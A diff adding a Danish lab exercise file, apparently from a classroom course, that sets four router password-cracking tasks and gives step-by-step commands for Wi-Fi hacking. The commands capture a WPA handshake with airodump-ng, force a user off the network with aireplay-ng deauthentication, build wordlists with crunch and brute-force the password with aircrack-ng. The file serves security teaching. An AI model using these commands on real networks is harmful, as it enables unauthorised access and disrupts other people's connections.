@@ -1,0 +1,44 @@
+---------Opgaver---------
+-Router#1 – Password på 8 karakterer. Passwordet indeholder navnet på Henriks kat samt årstal for hvornår Henrik startede med at undervise på UCN – eks: ”Navn1900”.
+--Hint: Brug Crunch til at lave en ordliste, hvor du anvender et mønster. eks.: crunch 8 8 0123456789 -t Navn@@@@ -o minOrdlisteTilOpgave2
+
+-Router#2 – Anvend eksisterende ordlister fra internettet (ligger allerede på computeren). Passwordet er gemt i en af listerne.
+--Hint: Du kan enten sammensætte alle listerne til en enkelt liste eller tage én liste ad gangen. Brug ”cat” kommandoen i en terminal til at sammensætte listerne.
+--Hint: det nødvendigt at kopiere ordlisterne et andet sted hen eller anvende ”./” til at referer til eksisterende mappe: Eks. ”./ordliste1.txt”
+--Ordlisterne ligger i mappen /home/stem
+
+-Router#3 – Password på mellem 7 og 8 karakterer. Tallene fra 0 til 9 kan indgå.
+
+-Router#4 – Godt password som er svært/umuligt at hacke
+--Hvordan vil du gribe det an?
+
+
+
+---------Trin i Hack et WIFI---------
+Alle dele af kommandoer, som er pakket ind i {} skal ændres til at passe til dit arbejde og din computer (tuborg-klammerne skal slettes)
+
+-Trin 1
+--Udvælg mål ved at liste alle netværk/hotspots
+--kør kommandoen: sudo airodump-ng --band abg  {wlan1}
+
+-Trin 2
+--Overvåg et bestemt netværk så vi kan opsamle handshake
+--Kør kommandoen: sudo airodump-ng -channel {6} --bssid {Accesspoint MAC-adresse} -w {handshake} {wlan1}
+
+-Trin 3
+--Smid en bruger af netværket for at stjæle dennes handshake
+--Kør kommandoen: sudo aireplay-ng --deauth 5 -a {Accesspoint MAC-adresse} -c {Brugerens MAC-adresse} {wlan1}
+
+-Trin 4
+--Lav din egen ordliste
+--Kør kommandoen (uden mønster): crunch {8} {8} {123456789} -o {minOrdliste1}
+--Kør kommandoen (med mønster):  crunch {8} {8} {123456789} -t {a@@@@b} -o {minOrdliste2}
+
+-Trin 5
+--Gæt kodeordet (brute force)
+--Kør kommandoen: sudo aircrack-ng {handshake.cap} -w {minOrdliste1} | tee
+
+
+
+
+
